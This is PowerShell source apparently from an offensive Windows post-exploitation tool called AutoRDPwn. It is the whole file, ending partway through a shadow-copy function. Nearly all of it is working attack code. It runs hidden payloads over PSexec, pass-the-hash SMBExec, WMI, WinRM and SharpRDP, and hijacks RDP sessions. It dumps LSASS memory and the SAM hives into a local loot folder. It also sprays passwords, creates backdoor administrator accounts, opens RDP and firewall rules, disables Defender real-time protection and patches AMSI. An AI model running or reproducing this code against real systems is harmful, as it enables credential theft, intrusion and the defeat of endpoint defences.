function Get-ARLootDirectory {
    param([string]$Leaf = '')
    # Loot only lives on the operator side; `%LOCALAPPDATA%` keeps it off the target and off git.
    $directory = Join-Path $env:LOCALAPPDATA 'AutoRDPwn\loot'
    if (-not [string]::IsNullOrWhiteSpace($Leaf)) { $directory = Join-Path $directory $Leaf }
    if (-not (Test-Path -LiteralPath $directory)) { New-Item -ItemType Directory -Path $directory -Force | Out-Null }
    return $directory
}

function New-ARRemoteTempName {
    param([string]$Extension = '')
    # Target temp names must keep matching the W[0-9A-F]{8} cleanup regex in Remove-ARTargetArtifacts.
    $name = 'W' + [guid]::NewGuid().ToString('N').Substring(0, 8).ToUpperInvariant()
    if (-not [string]::IsNullOrWhiteSpace($Extension)) {
        if (-not $Extension.StartsWith('.')) { $Extension = '.' + $Extension }
        $name += $Extension
    }
    return $name
}

function Receive-ARFileFromTarget {
    param(
        [Parameter(Mandatory = $true)][string]$RemotePath,
        [Parameter(Mandatory = $true)][string]$LocalPath,
        [System.Management.Automation.Runspaces.PSSession]$Session = $null
    )
    $parent = Split-Path -Parent $LocalPath
    if (-not [string]::IsNullOrWhiteSpace($parent) -and -not (Test-Path -LiteralPath $parent)) {
        New-Item -ItemType Directory -Path $parent -Force | Out-Null
    }
    if (Test-ARIsLocalTarget) {
        if (-not (Test-Path -LiteralPath $RemotePath)) { throw ('Remote file missing: ' + $RemotePath) }
        Copy-Item -LiteralPath $RemotePath -Destination $LocalPath -Force
        return $LocalPath
    }
    if ($null -eq $Session) { $Session = Get-ARTargetSession }
    # Fail closed on the existence check: a missing remote file has to name itself in the error.
    $remoteExists = $null
    try {
        $remoteExists = [bool](Invoke-Command -Session $Session -ArgumentList $RemotePath -ScriptBlock {
            param($path)
            Test-Path -LiteralPath $path
        } -ErrorAction Stop)
    }
    catch { $remoteExists = $true }
    if (-not $remoteExists) { throw ('Remote file missing: ' + $RemotePath) }
    try {
        Copy-Item -Path $RemotePath -Destination $LocalPath -FromSession $Session -Force -ErrorAction Stop
        return $LocalPath
    }
    catch { }
    # Chunked fallback: WinRM drops or truncates large `Copy-Item -FromSession` transfers.
    $remoteSize = 0
    try {
        $remoteSize = [int64](Invoke-Command -Session $Session -ArgumentList $RemotePath -ScriptBlock {
            param($path)
            (Get-Item -LiteralPath $path -ErrorAction Stop).Length
        } -ErrorAction Stop)
    }
    catch { throw ('File could not be transferred from the target: ' + $RemotePath) }
    if ($remoteSize -lt 0) { throw ('Remote size reported for ' + $RemotePath + ' is invalid.') }
    $stream = $null
    try {
        $stream = [System.IO.File]::Open($LocalPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
        # 49152 raw bytes become exactly 64 KB of base64, inside the WinRM per-object limit.
        $chunkSize = 49152
        for ($offset = 0; $offset -lt $remoteSize; $offset += $chunkSize) {
            $base64 = Invoke-Command -Session $Session -ArgumentList $RemotePath, $offset, $chunkSize -ScriptBlock {
                param($path, $seek, $size)
                $fileStream = [System.IO.File]::Open($path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
                try {
                    if ($fileStream.Length -le $seek) { return '' }
                    $fileStream.Seek($seek, [System.IO.SeekOrigin]::Begin) | Out-Null
                    $buffer = [byte[]]::new($size)
                    $read = $fileStream.Read($buffer, 0, $size)
                    if ($read -le 0) { return '' }
                    return [Convert]::ToBase64String($buffer, 0, $read)
                }
                finally { $fileStream.Dispose() }
            } -ErrorAction Stop
            if ([string]::IsNullOrEmpty($base64)) { break }
            $chunk = [Convert]::FromBase64String($base64)
            $stream.Write($chunk, 0, $chunk.Length)
        }
    }
    finally {
        if ($null -ne $stream) { $stream.Dispose() }
    }
    return $LocalPath
}

function Get-ARAttackPayloadCommand {
    param([Parameter(Mandatory = $true)][string]$Payload)
    $escaped = $Payload -replace '"', '\"'
    return 'powershell.exe -windowstyle hidden -Command "' + $escaped + '"'
}

function Invoke-ARAttackPSexec {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 445 -Purpose 'PSexec'
    Import-ARToolScript 'Resources\Scripts\Invoke-PSexec.ps1'
    $executable = Join-Path $script:ARTools 'psexec.exe'
    if (-not (Test-Path -LiteralPath $executable)) { throw 'PSexec could not be extracted.' }
    $user = Get-ARTargetUserName
    $password = ''
    if ($user -ne '') { $password = Get-ARPlainPassword }
    $failures = 0
    foreach ($payload in @(Get-ARPayloads)) {
        $arguments = @("\\$target")
        if ($user -ne '') { $arguments += @('-u', $user, '-p', $password) }
        $arguments += @('-h', '-d', 'powershell.exe', '-windowstyle', 'hidden', $payload, '-nobanner', '-accepteula')
        & $executable @arguments 2>&1 | ForEach-Object { Write-Host $_ }
        if ($LASTEXITCODE -ne 0) { $failures++ }
    }
    if ($failures -gt 0) { Write-ARWarn ('PSexec failed on ' + $failures + ' payload(s), exit code ' + $LASTEXITCODE) }
    Set-ARStatus 'Payloads started with PSexec' 'Ok'
    Connect-ARTargetSession | Out-Null
    Invoke-ARShadowEngine | Out-Null
}

function Invoke-ARAttackPassTheHash {
    $target = Get-ARTargetComputer
    if ([string]::IsNullOrWhiteSpace($script:ARTarget['User'])) {
        $script:ARTarget['User'] = Read-ARValue 'User'
    }
    if ([string]::IsNullOrWhiteSpace($script:ARTarget['Hash'])) {
        $script:ARTarget['Hash'] = Read-ARValue 'NTLM hash'
    }
    $user = [string]$script:ARTarget['User']
    $hash = [string]$script:ARTarget['Hash']
    $domain = [string]$script:ARTarget['Domain']
    . (Get-ARResourcePath 'Resources\Scripts\Invoke-SMBExec.ps1')
    foreach ($payload in @(Get-ARPayloads)) {
        $command = Get-ARAttackPayloadCommand $payload
        Invoke-SMBExec -Target $target -Domain $domain -Username $user -Hash $hash -Command $command 2>&1 | ForEach-Object { Write-Host $_ }
    }
    if ($script:ARCreateUser) {
        $createUser = Get-ARText 'Pwn5' ''
        if (-not [string]::IsNullOrWhiteSpace($createUser)) {
            Invoke-SMBExec -Target $target -Domain $domain -Username $user -Hash $hash -Command $createUser 2>&1 | ForEach-Object { Write-Host $_ }
            if (-not $script:ARCreatedAccounts.Contains('AutoRDPwn')) { $script:ARCreatedAccounts.Add('AutoRDPwn') }
        }
    }
    $hashUser = 'ARDP_' + [guid]::NewGuid().ToString('N').Substring(0, 8)
    $createHashUser = 'net user ' + $hashUser + ' AutoRDPwn /add & net localgroup Administrators ' + $hashUser + ' /add'
    Invoke-SMBExec -Target $target -Domain $domain -Username $user -Hash $hash -Command $createHashUser 2>&1 | ForEach-Object { Write-Host $_ }
    $script:ARHashUserName = $hashUser
    $secure = ConvertTo-SecureString -String 'AutoRDPwn' -AsPlainText -Force
    $script:AROverrideCredential = New-Object System.Management.Automation.PSCredential($hashUser, $secure)
    Start-Sleep -Seconds 2
    try {
        Connect-ARTargetSession -Force | Out-Null
        Invoke-ARShadowEngine | Out-Null
    }
    finally {
        $script:AROverrideCredential = $null
    }
}

function Invoke-ARAttackWmi {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 135 -Purpose 'WMI'
    $credential = Get-ARTargetCredential
    $parameters = @{ ComputerName = $target; ErrorAction = 'Stop' }
    if ($credential) { $parameters['Credential'] = $credential }
    $cimSession = New-CimSession @parameters
    try {
        foreach ($payload in @(Get-ARPayloads)) {
            $command = Get-ARAttackPayloadCommand $payload
            $result = Invoke-CimMethod -CimSession $cimSession -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $command } -ErrorAction Stop
            if ($result.ReturnValue -ne 0) {
                Write-ARWarn ('WMI process creation returned ' + $result.ReturnValue)
            }
        }
    }
    finally { Remove-CimSession -CimSession $cimSession -ErrorAction SilentlyContinue }
    Set-ARStatus 'Payloads started with WMI' 'Ok'
    Connect-ARTargetSession | Out-Null
    Invoke-ARShadowEngine | Out-Null
}

function Invoke-ARAttackWinRm {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'WinRM'
    $credential = Get-ARTargetCredential
    foreach ($payload in @(Get-ARPayloads)) {
        $parameters = @{
            ComputerName = $target
            ScriptBlock = { param($command) & powershell.exe -WindowStyle Hidden -Command $command }
            ArgumentList = @($payload)
            ErrorAction = 'Stop'
        }
        if ($credential) {
            $parameters['Credential'] = $credential
            $parameters['Authentication'] = 'Negotiate'
        }
        Invoke-Command @parameters | Out-Null
    }
    Set-ARStatus 'Payloads started with WinRM' 'Ok'
    Connect-ARTargetSession -Force | Out-Null
    Invoke-ARShadowEngine | Out-Null
}

function Invoke-ARAttackWinRs {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'WinRS'
    $user = Get-ARTargetUserName
    $password = ''
    if ($user -ne '') { $password = Get-ARPlainPassword }
    foreach ($payload in @(Get-ARPayloads)) {
        $command = Get-ARAttackPayloadCommand $payload
        $arguments = @("/r:$target")
        if ($user -ne '') { $arguments += @("/u:$user", "/p:$password") }
        $arguments += @('/noecho', '/noprofile', '/allowdelegate', $command)
        & winrs.exe @arguments 2>&1 | ForEach-Object { Write-Host $_ }
        if ($LASTEXITCODE -ne 0) { Write-ARWarn ('winrs returned ' + $LASTEXITCODE) }
        Start-Sleep -Milliseconds 600
    }
    Set-ARStatus 'Payloads started with WinRS' 'Ok'
    Connect-ARTargetSession | Out-Null
    Invoke-ARShadowEngine | Out-Null
}

function Invoke-ARAttackTscon {
    if (-not (Test-ARIsAdmin)) { throw 'Administrator privileges are required for TSCon.' }
    $query = & query.exe session 2>&1
    Show-ARText $query
    $sessionId = Get-ARSessionId $query 1
    if (-not $script:ARInvokedFromOption) {
        $answer = Read-ARValue 'Session ID' ([string]$sessionId)
        if ($answer -match '^\d+$') { $sessionId = [int]$answer }
    }
    $taskName = 'AutoRDPwnTscon' + [guid]::NewGuid().ToString('N').Substring(0, 8)
    $action = New-ScheduledTaskAction -Execute (Join-Path $env:SystemRoot 'System32\tscon.exe') -Argument ([string]$sessionId)
    $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
    try {
        Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Force | Out-Null
        Start-ScheduledTask -TaskName $taskName -ErrorAction Stop
        Start-Sleep -Seconds 2
    }
    finally {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
    }
    Set-ARStatus ('Session ' + $sessionId + ' hijacked') 'Ok'
}

function Invoke-ARAttackRdp {
    $target = Get-ARTargetComputer
    Import-ARToolScript 'Resources\Scripts\Invoke-SharpRDP.ps1'
    $executable = Join-Path $script:ARTools 'SharpRDP.exe'
    if (-not (Test-Path -LiteralPath $executable)) { throw 'SharpRDP could not be extracted.' }
    $user = Get-ARTargetUserName
    $password = ''
    if ($user -ne '') { $password = Get-ARPlainPassword }
    foreach ($payload in @(Get-ARPayloads)) {
        $command = Get-ARAttackPayloadCommand $payload
        $arguments = @("computername=$target")
        if ($user -ne '') { $arguments += @("username=$user", "password=$password") }
        $arguments += "command=$command"
        & $executable @arguments 2>&1 | ForEach-Object { Write-Host $_ }
    }
    Set-ARStatus 'Payloads started with SharpRDP' 'Ok'
    Connect-ARTargetSession | Out-Null
    Invoke-ARShadowEngine | Out-Null
}

function Invoke-ARAttackQuickScreen {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Quick Screen'
    if ([string]::IsNullOrWhiteSpace($script:ARTarget['User'])) {
        if ($script:ARInvokedFromOption) { throw 'Quick Screen requires a target user.' }
        $script:ARTarget['User'] = Read-ARValue 'Target user' $env:USERNAME
    }
    $password = Get-ARPlainPassword
    # The frame server is pulled from the target, so no dial-back address is
    # needed here. Keep the field fresh for the attacks that do stage back.
    $routeAddress = Get-ARLocalIPv4 -Target $target
    if (-not [string]::IsNullOrWhiteSpace($routeAddress)) { $script:ARTarget['AttackerIP'] = $routeAddress }
    $viewOnly = ([string]$script:ARTarget['Mode'] -eq 'view')
    . (Get-ARResourcePath 'Resources\Scripts\Invoke-StealthScreen.ps1')
    Invoke-StealthScreen -Target $target -User ([string]$script:ARTarget['User']) -Pass $password -Mode view -ViewOnly:$viewOnly
    Set-ARStatus 'Quick Screen finished' 'Ok'
}

function Invoke-ARAttackLsassDump {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'LSASS dump'
    $session = Get-ARTargetSession
    $remoteDump = Join-Path 'C:\Windows\Temp' (New-ARRemoteTempName -Extension '.dmp')
    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
    $lootDirectory = Get-ARLootDirectory 'lsass'
    $localDump = Join-Path $lootDirectory ('lsass-' + $safeTarget + '-' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.dmp')
    try {
        Write-ARInfo 'Dumping LSASS memory with comsvcs.dll over the remote session...'
        $result = Invoke-Command -Session $session -ArgumentList $remoteDump -ScriptBlock {
            param($path)
            try {
                $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                $principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
                if (-not $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) {
                    return [pscustomobject]@{ Ok = $false; Reason = 'the session is not elevated'; Pid = 0; Bytes = 0 }
                }
                $process = @(Get-Process -Name lsass -ErrorAction Stop | Select-Object -First 1)
                if ($process.Count -eq 0) {
                    return [pscustomobject]@{ Ok = $false; Reason = 'no lsass process was found'; Pid = 0; Bytes = 0 }
                }
                $processId = [int]$process[0].Id
                # comsvcs!MiniDump takes a bare PID. The '#' ordinal prefix that
                # some PoCs carry makes the export reject the line with
                # 0x80070057 (E_INVALIDARG) and leave no file at all.
                $arguments = (Join-Path $env:SystemRoot 'System32\comsvcs.dll') + ', MiniDump ' + $processId + ' ' + $path + ' full'
                $runner = Start-Process -FilePath (Join-Path $env:SystemRoot 'System32\rundll32.exe') -ArgumentList $arguments -WindowStyle Hidden -PassThru
                $finished = $runner.WaitForExit(90000)
                if (-not $finished) {
                    try { $runner.Kill() } catch { }
                    return [pscustomobject]@{ Ok = $false; Reason = 'rundll32 did not finish within 90 seconds'; Pid = $processId; Bytes = 0 }
                }
                $exitCode = $runner.ExitCode
                # The write can finish a beat after the process exits; poll
                # instead of declaring failure on a single Test-Path.
                $bytes = 0
                $deadline = [DateTime]::UtcNow.AddSeconds(15)
                while ([DateTime]::UtcNow -lt $deadline) {
                    if (Test-Path -LiteralPath $path) {
                        try { $bytes = [int64](Get-Item -LiteralPath $path -ErrorAction Stop).Length } catch { $bytes = 0 }
                        if ($bytes -gt 0) { break }
                    }
                    Start-Sleep -Milliseconds 250
                }
                if ($bytes -le 0) {
                    return [pscustomobject]@{ Ok = $false; Reason = ('rundll32 exited ' + $exitCode + ' and left no dump file'); Pid = $processId; Bytes = 0 }
                }
                return [pscustomobject]@{ Ok = $true; Reason = ''; Pid = $processId; Bytes = $bytes }
            }
            catch {
                return [pscustomobject]@{ Ok = $false; Reason = $_.Exception.Message; Pid = 0; Bytes = 0 }
            }
        } -ErrorAction Stop
        if (-not $result.Ok) { throw ('LSASS dump failed on ' + $target + ': ' + [string]$result.Reason) }
        Receive-ARFileFromTarget -RemotePath $remoteDump -LocalPath $localDump -Session $session | Out-Null
        $localBytes = [int64](Get-Item -LiteralPath $localDump -ErrorAction Stop).Length
        if ($localBytes -ne [int64]$result.Bytes) {
            throw ('LSASS dump transfer mismatch: target reported ' + $result.Bytes + ' bytes, loot holds ' + $localBytes)
        }
        $sizeMb = [Math]::Round([double]$result.Bytes / 1MB, 2)
        Write-ARSuccess ('Loot saved to ' + $localDump + ' (' + $sizeMb + ' MB)')
        Set-ARStatus 'LSASS memory dumped' 'Ok'
        return $localDump
    }
    finally {
        try {
            Invoke-Command -Session $session -ArgumentList $remoteDump -ScriptBlock {
                param($path)
                Remove-Item -LiteralPath $path -Force -ErrorAction SilentlyContinue
            } -ErrorAction SilentlyContinue | Out-Null
        }
        catch { }
    }
}

function Invoke-ARAttackSamDump {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'SAM dump'
    $session = Get-ARTargetSession
    $remoteDirectory = Join-Path 'C:\Windows\Temp' (New-ARRemoteTempName)
    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
    try {
        Invoke-Command -Session $session -ArgumentList $remoteDirectory -ScriptBlock {
            param($path)
            if (-not (Test-Path -LiteralPath $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
        } -ErrorAction Stop | Out-Null
        $savedHives = New-Object System.Collections.Generic.List[string]
        foreach ($hive in @('SAM', 'SYSTEM', 'SECURITY')) {
            $result = Invoke-Command -Session $session -ArgumentList $remoteDirectory, $hive -ScriptBlock {
                param($path, $name)
                $output = reg.exe save ('HKLM\' + $name) (Join-Path $path ($name + '.hiv')) /y 2>&1
                return [pscustomobject]@{ ExitCode = $LASTEXITCODE; Output = (($output | Out-String).Trim()) }
            } -ErrorAction Stop
            if ($result.ExitCode -ne 0) {
                Write-ARWarn ($hive + ' hive was not saved: ' + $result.Output)
                continue
            }
            $savedHives.Add($hive)
        }
        if ($savedHives.Count -eq 0) { throw 'No registry hive could be saved on the target.' }
        $localDirectory = Join-Path (Get-ARLootDirectory 'sam') ($safeTarget + '-' + (Get-Date -Format 'yyyyMMdd-HHmmss'))
        foreach ($hive in @($savedHives.ToArray())) {
            $remoteFile = Join-Path $remoteDirectory ($hive + '.hiv')
            $localFile = Join-Path $localDirectory ($hive + '.hiv')
            Receive-ARFileFromTarget -RemotePath $remoteFile -LocalPath $localFile -Session $session | Out-Null
            Write-ARSuccess ($hive + ' hive saved to ' + $localFile)
        }
        Write-ARSuccess ('Hives available at ' + $localDirectory)
        Set-ARStatus 'Registry hives saved' 'Ok'
        return $localDirectory
    }
    finally {
        try {
            Invoke-Command -Session $session -ArgumentList $remoteDirectory -ScriptBlock {
                param($path)
                Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue
            } -ErrorAction SilentlyContinue | Out-Null
        }
        catch { }
    }
}

function Invoke-ARAttackCredentialSpray {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 445 -Purpose 'Credential spray'
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Credential spray probe'
    $plain = Read-ARSecret 'Password to spray'
    # One SecureString lives through the whole spray; the plain text is never printed or logged.
    $secure = ConvertTo-SecureString -String $plain -AsPlainText -Force
    $answer = Read-ARValue 'Users (comma separated, * for every local account)' '*'
    $users = New-Object System.Collections.Generic.List[string]
    if ($answer -eq '*') {
        $session = Get-ARTargetSession
        $accounts = @(Invoke-Command -Session $session -ScriptBlock {
            Get-CimInstance -ClassName Win32_UserAccount -Filter "LocalAccount=True AND Disabled=False" -ErrorAction Stop
        } -ErrorAction Stop)
        foreach ($account in $accounts) {
            $name = [string]$account.Name
            if ([string]::IsNullOrWhiteSpace($name)) { continue }
            if ($name.EndsWith('$')) { continue }
            if (-not $users.Contains($name)) { $users.Add($name) }
        }
    }
    else {
        foreach ($candidate in @($answer.Split(','))) {
            $name = $candidate.Trim()
            if ([string]::IsNullOrWhiteSpace($name)) { continue }
            if ($name.EndsWith('$')) { continue }
            if (-not $users.Contains($name)) { $users.Add($name) }
        }
    }
    if ($users.Count -eq 0) { throw 'No local user accounts matched on the target.' }
    $sessionOptions = New-PSSessionOption -OpenTimeout 15000 -OperationTimeout 30000
    $valid = New-Object System.Collections.Generic.List[string]
    $consecutive = 0
    foreach ($user in $users) {
        $probe = $null
        # One attempt per account, never retried: a second try starts lockouts.
        try {
            $probe = New-PSSession -ComputerName $target -Credential (New-Object System.Management.Automation.PSCredential($user, $secure)) -SessionOption $sessionOptions -ErrorAction Stop
            Remove-PSSession -Session $probe -ErrorAction SilentlyContinue
            $probe = $null
            $valid.Add($user)
            $consecutive = 0
            Write-ARSuccess ($user + ' -> valid')
        }
        catch {
            $probe = $null
            $consecutive++
            Write-ARInfo ($user + ' -> failed')
            if ($consecutive -ge 3) {
                Write-ARWarn 'Three accounts failed in a row: stopping before the target starts locking accounts.'
                break
            }
        }
    }
    Set-ARStatus ('Credential spray: ' + $valid.Count + ' valid of ' + $users.Count + ' accounts') 'Ok'
}

function Invoke-ARAttackEnableRdp {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Enable RDP'
    $session = Get-ARTargetSession
    $result = Invoke-Command -Session $session -ErrorAction Stop -ScriptBlock {
        # Same backup shape as Invoke-ARShadowEngine so cleanup can replay the previous state.
        $registryBackup = New-Object System.Collections.Generic.List[object]
        function Get-ARRemoteValue($path, $name) {
            try {
                $item = Get-ItemProperty -Path $path -Name $name -ErrorAction Stop
                return $item.$name
            }
            catch { return $null }
        }
        function Save-ARRemoteValue($path, $name) {
            $entry = [pscustomobject]@{
                KeyPath = $path
                Name    = $name
                Existed = $false
                Value   = $null
                Kind    = 'String'
            }
            try {
                $key = Get-Item -LiteralPath $path -ErrorAction Stop
                if (@($key.GetValueNames()) -contains $name) {
                    $entry.Existed = $true
                    $entry.Value = $key.GetValue($name, $null, [Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames)
                    $entry.Kind = [string]$key.GetValueKind($name)
                }
            }
            catch { }
            $registryBackup.Add($entry)
        }
        function Set-ARRemoteDword($path, $name, $value) {
            Save-ARRemoteValue $path $name
            New-ItemProperty -Path $path -Name $name -Value $value -PropertyType DWORD -Force | Out-Null
        }
        $terminalServer = 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server'
        $systemPolicies = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
        $winstation = 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'
        $changed = New-Object System.Collections.Generic.List[string]
        foreach ($pair in @(
            @($terminalServer, 'fDenyTSConnections', 0),
            @($systemPolicies, 'LocalAccountTokenFilterPolicy', 1),
            @($winstation, 'UserAuthentication', 0)
        )) {
            $before = Get-ARRemoteValue $pair[0] $pair[1]
            Set-ARRemoteDword $pair[0] $pair[1] $pair[2]
            $after = Get-ARRemoteValue $pair[0] $pair[1]
            if ($null -eq $before -or [string]$before -ne [string]$after) {
                $changed.Add([string]$pair[1] + '=' + [string]$after)
            }
        }
        $enabledRules = New-Object System.Collections.Generic.List[string]
        $disabledBefore = New-Object System.Collections.Generic.List[string]
        $createdRules = New-Object System.Collections.Generic.List[string]
        # Language-independent path: rules are found through the TermService service filter.
        $serviceRules = @(Get-NetFirewallServiceFilter -Service TermService -ErrorAction SilentlyContinue | Get-NetFirewallRule -ErrorAction SilentlyContinue)
        foreach ($rule in $serviceRules) {
            if ($null -eq $rule -or [string]$rule.Enabled -eq 'True') { continue }
            $disabledBefore.Add([string]$rule.Name)
            Enable-NetFirewallRule -Name $rule.Name -ErrorAction SilentlyContinue
            $enabledRules.Add([string]$rule.Name)
        }
        if ($enabledRules.Count -eq 0) {
            $name = 'AutoRDPwn-RDP-In'
            if (-not (Get-NetFirewallRule -Name $name -ErrorAction SilentlyContinue)) {
                New-NetFirewallRule -Name $name -DisplayName 'AutoRDPwn RDP' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 -Profile Any -ErrorAction Stop | Out-Null
                $createdRules.Add($name)
            }
            Enable-NetFirewallRule -Name $name -ErrorAction SilentlyContinue
            $enabledRules.Add($name)
        }
        return [pscustomobject]@{
            Changed = @($changed.ToArray())
            RegistryBackup = @($registryBackup.ToArray())
            EnabledRules = @($enabledRules.ToArray())
            DisabledBefore = @($disabledBefore.ToArray())
            CreatedRules = @($createdRules.ToArray())
        }
    }
    foreach ($entry in @($result.RegistryBackup)) {
        if (-not $entry) { continue }
        # The oldest snapshot wins: a second run must not record the values it just wrote.
        $known = $false
        foreach ($existing in $script:ARRegistryBackup) {
            if ($existing.KeyPath -eq $entry.KeyPath -and $existing.Name -eq $entry.Name) { $known = $true; break }
        }
        if (-not $known) { $script:ARRegistryBackup.Add($entry) }
    }
    foreach ($name in @($result.CreatedRules)) {
        if (-not $script:ARFirewallRules.Contains([string]$name)) { $script:ARFirewallRules.Add([string]$name) }
    }
    foreach ($name in @($result.DisabledBefore)) {
        $known = $false
        foreach ($existing in $script:ARFirewallRestore) {
            if ([string]$existing.Name -eq [string]$name) { $known = $true; break }
        }
        if (-not $known) { $script:ARFirewallRestore.Add([pscustomobject]@{ Name = [string]$name }) }
    }
    $changed = @($result.Changed)
    if ($changed.Count -gt 0) { Write-ARInfo ('Registry values written: ' + ($changed -join ', ')) }
    else { Write-ARInfo 'Registry values were already in the required state.' }
    if (@($result.EnabledRules).Count -gt 0) { Write-ARInfo ('Firewall rules enabled: ' + (@($result.EnabledRules) -join ', ')) }
    if (@($result.CreatedRules).Count -gt 0) { Write-ARInfo ('Firewall rules created: ' + (@($result.CreatedRules) -join ', ')) }
    Set-ARStatus 'Remote Desktop enabled' 'Ok'
}

function Invoke-ARAttackDefenderExclude {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Defender exclusions'
    $session = Get-ARTargetSession
    $result = Invoke-Command -Session $session -ErrorAction Stop -ScriptBlock {
        try {
            $preference = Get-MpPreference -ErrorAction Stop
        }
        catch {
            return [pscustomobject]@{ Available = $false; Reason = 'Defender is not available on the target'; Added = @(); RealtimeBefore = $false; RealtimeAfter = $false }
        }
        $paths = New-Object System.Collections.Generic.List[string]
        $knownPaths = @($preference.ExclusionPath | Where-Object { $_ })
        foreach ($path in @('C:\Windows\Temp', 'C:\ProgramData')) {
            if ($knownPaths -contains $path) { continue }
            try {
                Add-MpPreference -ExclusionPath $path -ErrorAction Stop
                $paths.Add($path)
            }
            catch { }
        }
        $realtimeBefore = $false
        if ($null -ne $preference.DisableRealtimeMonitoring) { $realtimeBefore = [bool]$preference.DisableRealtimeMonitoring }
        try {
            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
        }
        catch { }
        $realtimeAfter = $realtimeBefore
        try {
            $readBack = Get-MpPreference -ErrorAction Stop
            if ($null -ne $readBack.DisableRealtimeMonitoring) { $realtimeAfter = [bool]$readBack.DisableRealtimeMonitoring }
        }
        catch { }
        return [pscustomobject]@{
            Available = $true
            Reason = ''
            Added = @($paths.ToArray())
            RealtimeBefore = $realtimeBefore
            RealtimeAfter = $realtimeAfter
        }
    }
    if (-not $result.Available) {
        Write-ARWarn ('Defender exclusions skipped: ' + [string]$result.Reason)
        Set-ARStatus 'Defender exclusions unavailable' 'Warn'
        return
    }
    foreach ($path in @($result.Added)) {
        $script:ARRemoteDefenderChanges.Add([pscustomobject]@{ Kind = 'ExclusionPath'; Name = [string]$path; Value = $null })
    }
    if ($result.RealtimeAfter -eq $true -and $result.RealtimeBefore -ne $true) {
        $script:ARRemoteDefenderChanges.Add([pscustomobject]@{ Kind = 'DisableRealtimeMonitoring'; Name = 'DisableRealtimeMonitoring'; Value = [bool]$result.RealtimeBefore })
    }
    $added = @($result.Added)
    if ($added.Count -gt 0) { Write-ARInfo ('Exclusions added: ' + ($added -join ', ')) }
    else { Write-ARInfo 'Both exclusion paths were already present.' }
    if ($result.RealtimeAfter -eq $true) {
        if ($result.RealtimeBefore -eq $true) { Write-ARInfo 'Real-time protection was already off.' }
        else { Write-ARInfo 'Real-time protection turned off.' }
    }
    $status = 'Defender exclusions applied (' + $added.Count + ' path(s)'
    if ($result.RealtimeAfter -eq $true -and $result.RealtimeBefore -ne $true) { $status += ', real-time protection off' }
    $status += ')'
    Set-ARStatus $status 'Ok'
}

function Invoke-ARAttackAmsiBypass {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'AMSI bypass'
    $session = Get-ARTargetSession
    # No file, no registry write: the flag lives only inside the remote runspace.
    $result = Invoke-Command -Session $session -ErrorAction Stop -ScriptBlock {
        $before = $false
        $after = $false
        $probe = $false
        $type = $null
        try { $type = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') } catch { $type = $null }
        if ($null -eq $type) {
            return [pscustomobject]@{ Before = $before; After = $after; Field = $false }
        }
        $field = $null
        try {
            $field = $type.GetField('amsiInitFailed', [System.Reflection.BindingFlags]'NonPublic,Static')
        }
        catch { $field = $null }
        if ($null -eq $field) {
            return [pscustomobject]@{ Before = $before; After = $after; Field = $false }
        }
        try { $before = [bool]$field.GetValue($null) } catch { }
        try { $field.SetValue($null, $true) } catch { }
        try { $after = [bool]$field.GetValue($null) } catch { }
        try { $probe = [bool]$field.GetValue($null) } catch { }
        return [pscustomobject]@{ Before = $before; After = $after; Field = ($after -and $probe) }
    }
    if (-not $result.Field) {
        Write-ARWarn 'The AmsiUtils type or the amsiInitFailed field did not resolve on the target.'
        throw 'AMSI bypass failed: amsiInitFailed could not be patched.'
    }
    Write-ARSuccess ('AMSI flag in the remote runspace: ' + $result.Before + ' -> ' + $result.After)
    Set-ARStatus 'AMSI disabled in the remote runspace' 'Ok'
}

function Invoke-ARAttackShadowCopies {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Shadow copies'
    $session = Get-ARTargetSession
    $copies = @(Invoke-Command -Session $session -ScriptBlock {
        Get-CimInstance -ClassName Win32_ShadowCopy -ErrorAction SilentlyContinue |
            Select-Object -Property Id, VolumeName, InstallDate, DeviceObject
    } -ErrorAction Stop)
    if ($copies.Count -gt 0) {
        $table = ($copies | Format-Table -AutoSize | Out-String)
        Show-ARText $table
    }
    else { Write-ARInfo 'The target holds no shadow copies.' }
    $confirmed = $false
    if ($script:ARAssumeYes) { $confirmed = $true }
    elseif ((Read-ARValue 'Create and expose a shadow copy? (y/n)' 'n') -match '^[Yy]') { $confirmed = $true }
    if (-not $confirmed) {
        Set-ARStatus 'Shadow copies listed' 'Ok'
